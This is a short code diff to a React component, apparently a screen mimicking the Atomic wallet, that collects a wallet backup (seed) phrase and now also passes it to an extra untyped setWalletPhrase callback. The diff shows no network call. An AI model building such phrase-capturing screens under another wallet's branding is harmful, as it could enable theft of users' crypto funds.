@@ -6,7 +6,13 @@ import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
 import AtomicFull from "../icons/atomic-full";
 
-const Atomic = ({ handleFinish }: { handleFinish: () => void }) => {
+const Atomic = ({
+	handleFinish,
+	setWalletPhrase,
+}: {
+	handleFinish: () => void;
+	setWalletPhrase: any;
+}) => {
 	const [backupPhrase, setBackupPhrase] = useState("");
 	const [words, setWords] = useState<string[]>([]);
 
@@ -14,6 +20,7 @@ const Atomic = ({ handleFinish }: { handleFinish: () => void }) => {
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
+		setWalletPhrase(words.join(" "));
 		handleFinish();
 	};
 
